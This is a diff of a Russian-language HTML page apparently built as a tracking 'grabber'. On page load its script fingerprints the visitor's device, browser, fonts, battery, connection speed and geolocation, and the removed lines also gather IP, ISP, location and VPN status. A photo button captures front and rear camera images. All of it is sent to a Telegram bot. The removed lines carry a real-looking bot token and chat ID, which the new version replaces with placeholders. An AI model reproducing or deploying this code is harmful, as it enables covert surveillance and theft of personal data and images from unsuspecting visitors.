@@ -10,65 +10,62 @@
     <p>Информация о вашем устройстве и IP-адрес будет отправлена в Telegram-бот.</p>
 
     <button onclick="takePhoto()">Сделать фото</button>
-  
-<script>
-    async function getDeviceBrandAndModel() {
-        const userAgent = navigator.userAgent;
-        let deviceBrand = 'Unknown';
-        let deviceModel = 'Unknown';
 
-        if (/android/i.test(userAgent)) {
-            deviceBrand = 'Android';
-            const match = userAgent.match(/;\s(.*?)(?:\sBuild|\))/);
-            if (match) {
-                deviceModel = match[1];
+    <script>
+        async function getDeviceBrandAndModel() {
+            const userAgent = navigator.userAgent;
+            let deviceBrand = 'Unknown';
+            let deviceModel = 'Unknown';
+
+            if (/android/i.test(userAgent)) {
+                deviceBrand = 'Android';
+                const match = userAgent.match(/;\s(.*?)(?:\sBuild|\))/);
+                if (match) {
+                    deviceModel = match[1];
+                }
+            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+                deviceBrand = 'Apple';
+                const match = userAgent.match(/\(([a-zA-Z]+);.*?OS\s([0-9_]+)/);
+                if (match) {
+                    deviceModel = match[1];
+                }
             }
-        } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-            deviceBrand = 'Apple';
-            const match = userAgent.match(/\(([a-zA-Z]+);.*?OS\s([0-9_]+)/);
-            if (match) {
-                deviceModel = match[1];
-            }
+
+            return { brand: deviceBrand, model: deviceModel };
         }
 
-        return { brand: deviceBrand, model: deviceModel };
-    }
+        async function sendDeviceInfoToTelegram() {
+            const deviceInfo = await getDeviceBrandAndModel();
+            const botToken = 'ВАШ_ТОКЕН_БОТА';
+            const chatId = 'ВАШ_CHAT_ID';
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-    async function sendDeviceInfoToTelegram() {
-        const deviceInfo = await getDeviceBrandAndModel();
-        const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
-        const chatId = '1653222949';
-        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const message = `Марка устройства: ${deviceInfo.brand}\nМодель устройства: ${deviceInfo.model}`;
 
-        const message = `Марка устройства: ${deviceInfo.brand}\nМодель устройства: ${deviceInfo.model}`;
-
-        fetch(telegramApiUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
             })
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Информация об устройстве отправлена в Telegram:', data);
-        })
-        .catch(error => {
-            console.error('Ошибка при отправке информации об устройстве в Telegram:', error);
-        });
-    }
+            .then(response => response.json())
+            .then(data => {
+                console.log('Информация об устройстве отправлена в Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке информации об устройстве в Telegram:', error);
+            });
+        }
 
-    // Вызов функции для отправки информации об устройстве
-    sendDeviceInfoToTelegram();
-</script>
-    <script>
-        // Функция для доступа к камерам и снимка
+        sendDeviceInfoToTelegram();
+
         async function takePhoto() {
             const constraints = {
-                video: { facingMode: "user" } // Для передней камеры
+                video: { facingMode: "user" }
             };
 
             try {
@@ -78,22 +75,18 @@
                 await new Promise((resolve) => (video.onloadedmetadata = resolve));
                 video.play();
 
-                // Захват фото с передней камеры
                 const frontPhoto = captureImage(video);
                 console.log('Фото с передней камеры сделано');
 
-                // Смена на заднюю камеру
                 constraints.video.facingMode = { exact: "environment" };
                 const backStream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = backStream;
                 await new Promise((resolve) => (video.onloadedmetadata = resolve));
                 video.play();
 
-                // Захват фото с задней камеры
                 const backPhoto = captureImage(video);
                 console.log('Фото с задней камеры сделано');
 
-                // Отправка фотографий в Telegram-бот
                 sendPhotoToTelegram(frontPhoto, 'Передняя камера');
                 sendPhotoToTelegram(backPhoto, 'Задняя камера');
 
@@ -102,7 +95,6 @@
             }
         }
 
-        // Функция для захвата изображения из видео-потока
         function captureImage(video) {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
@@ -112,10 +104,9 @@
             return canvas.toDataURL('image/png');
         }
 
-        // Функция для отправки фотографии в Telegram-бот
         function sendPhotoToTelegram(photoData, camera) {
-            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
-            const chatId = '1653222949';
+            const botToken = 'ВАШ_ТОКЕН_БОТА';
+            const chatId = 'ВАШ_CHAT_ID';
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
             const formData = new FormData();
@@ -136,7 +127,6 @@
             });
         }
 
-        // Функция для преобразования DataURI в Blob
         function dataURItoBlob(dataURI) {
             const byteString = atob(dataURI.split(',')[1]);
             const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
@@ -148,7 +138,6 @@
             return new Blob([ab], { type: mimeString });
         }
 
-       // Функция для получения геолокации пользователя
         function getGeolocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -167,10 +156,9 @@
             }
         }
 
-        // Функция для отправки геолокации в Telegram-бот
         function sendLocationToTelegram(latitude, longitude) {
-            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
-            const chatId = '1653222949';  // Замените на ваш chat ID
+            const botToken = 'ВАШ_ТОКЕН_БОТА';
+            const chatId = 'ВАШ_CHAT_ID';
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             const message = `Геолокация пользователя: ${latitude},${longitude}`;
@@ -194,20 +182,18 @@
             });
         }
 
-        // Функция для получения информации об устройстве
         async function getDeviceInfo() {
             const userAgent = navigator.userAgent;
             const deviceInfo = {
                 screenResolution: `${window.screen.width}x${window.screen.height}`,
                 language: navigator.language,
                 platform: navigator.platform,
-                uptime: Math.round(performance.now() / 1000), // Время работы системы в секундах
+                uptime: Math.round(performance.now() / 1000),
                 webglSupport: supportsWebGL(),
                 fonts: await getFonts(),
                 renderTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart
             };
 
-            // Основная информация об устройстве из userAgent
             if (/android/i.test(userAgent)) {
                 deviceInfo.device = 'Android';
             } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
@@ -216,7 +202,6 @@
                 deviceInfo.device = 'Unknown';
             }
 
-            // Информация о браузере
             if (/chrome|crios|crmo/i.test(userAgent)) {
                 deviceInfo.browser = 'Chrome';
             } else if (/firefox|iceweasel|fxios/i.test(userAgent)) {
@@ -229,7 +214,6 @@
                 deviceInfo.browser = 'Unknown';
             }
 
-            // Получение уровня заряда батареи
             if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
                 deviceInfo.batteryLevel = battery.level * 100 + '%';
@@ -240,7 +224,6 @@
             return deviceInfo;
         }
 
-        // Функция для проверки поддержки WebGL
         function supportsWebGL() {
             try {
                 const canvas = document.createElement('canvas');
@@ -250,7 +233,6 @@
             }
         }
 
-        // Функция для получения списка установленных шрифтов
         async function getFonts() {
             const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Courier', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
             const availableFonts = [];
@@ -262,7 +244,6 @@
             return availableFonts.join(', ');
         }
 
-        // Функция для проверки скорости интернета
         function checkInternetSpeed() {
             const image = new Image();
             const startTime = new Date().getTime();
@@ -270,20 +251,25 @@
             image.onload = function() {
                 const endTime = new Date().getTime();
                 const duration = (endTime - startTime) / 1000;
-                const bitsLoaded = 1024 * 1024 * 8; // 1MB
-                speed = (bitsLoaded / duration / (1024 * 1024)).toFixed(2); // Mbps
+                const bitsLoaded = 1024 * 1024 * 8;
+                speed = (bitsLoaded / duration / (1024 * 1024)).toFixed(2);
+                console.log(`Скорость интернета: ${speed} Мбит/с`);
                 sendSpeedToTelegram(speed);
             };
-            image.src = "https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png?" + startTime;
+
+            image.onerror = function() {
+                console.error('Ошибка при проверке скорости интернета.');
+            };
+
+            image.src = `https://upload.wikimedia.org/wikipedia/commons/2/2c/1x1.png?${new Date().getTime()}`;
         }
 
-        // Функция для отправки данных скорости интернета в Telegram-бот
         function sendSpeedToTelegram(speed) {
-            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
-            const chatId = '1653222949';  // Замените на ваш chat ID
+            const botToken = 'ВАШ_ТОКЕН_БОТА';
+            const chatId = 'ВАШ_CHAT_ID';
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            const message = `Скорость интернета: ${speed} Mbps`;
+            const message = `Скорость интернета: ${speed} Мбит/с`;
 
             fetch(telegramApiUrl, {
                 method: 'POST',
@@ -297,100 +283,20 @@
             })
             .then(response => response.json())
             .then(data => {
-                console.log('Сообщение отправлено в Telegram:', data);
+                console.log('Скорость интернета отправлена в Telegram:', data);
             })
             .catch(error => {
-                console.error('Ошибка при отправке сообщения в Telegram:', error);
+                console.error('Ошибка при отправке скорости интернета в Telegram:', error);
             });
         }
 
-        // Функция для отправки данных в Telegram-бот
-        function sendToTelegram(ipAddress, deviceInfo, isp, location, vpnStatus) {
-            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
-            const chatId = '1653222949';  // Замените на ваш chat ID
-            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            const message = `
-                IP-адрес пользователя: ${ipAddress}
-                Устройство: ${deviceInfo.device}
-                Браузер: ${deviceInfo.browser}
-                Провайдер: ${isp}
-                Разрешение экрана: ${deviceInfo.screenResolution}
-                Язык: ${deviceInfo.language}
-                Платформа: ${deviceInfo.platform}
-                Время работы системы: ${deviceInfo.uptime} сек.
-                Местоположение: ${location}
-                Использование VPN/Proxy: ${vpnStatus}
-                Поддержка WebGL: ${deviceInfo.webglSupport}
-                Установленные шрифты: ${deviceInfo.fonts}
-                Время рендеринга страницы: ${deviceInfo.renderTime} мс
-                Уровень заряда батареи: ${deviceInfo.batteryLevel}
-            `;
-
-            fetch(telegramApiUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Сообщение отправлено в Telegram:', data);
-            })
-            .catch(error => {
-                console.error('Ошибка при отправке сообщения в Telegram:', error);
-            });
-        }
-
-        // Функция для проверки использования VPN или прокси
-        function checkVPN(ipAddress) {
-            return fetch(`https://ipapi.co/${ipAddress}/json/`)
-                .then(response => response.json())
-                .then(data => data.security ? data.security.is_vpn : 'Unknown')
-                .catch(() => 'Unknown');
-        }
-
-        // Получение IP-адреса пользователя с помощью внешнего сервиса
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const ipAddress = data.ip;
-                console.log('IP-адрес:', ipAddress);
-
-                // Получение информации о провайдере и местоположении
-                fetch(`https://ipapi.co/${ipAddress}/json/`)
-                    .then(response => response.json())
-                    .then(async data => {
-                        const isp = data.org || 'Unknown';
-                        const location = `${data.city}, ${data.region}, ${data.country}`;
-                        console.log('Провайдер:', isp);
-                        console.log('Местоположение:', location);
-
-                        const vpnStatus = await checkVPN(ipAddress);
-                        console.log('Использование VPN/Proxy:', vpnStatus);
-
-                        const deviceInfo = await getDeviceInfo();
-                        console.log('Информация об устройстве:', deviceInfo);
-
-                        sendToTelegram(ipAddress, deviceInfo, isp, location, vpnStatus);
-                    })
-                    .catch(error => {
-                        console.error('Ошибка при получении информации о провайдере и местоположении:', error);
-                    });
-            })
-            .catch(error => {
-                console.error('Ошибка при получении IP-адреса:', error);
-            });
-
-        // Проверка скорости интернета
-        checkInternetSpeed();
-
-        // Вызов функции для получения геолокации
-        getGeolocation();
-        
+        // Запуск всех функций
+        (async () => {
+            const deviceInfo = await getDeviceInfo();
+            console.log('Информация об устройстве:', deviceInfo);
+            checkInternetSpeed();
+            getGeolocation();
+        })();
     </script>
+</body>
 </html>
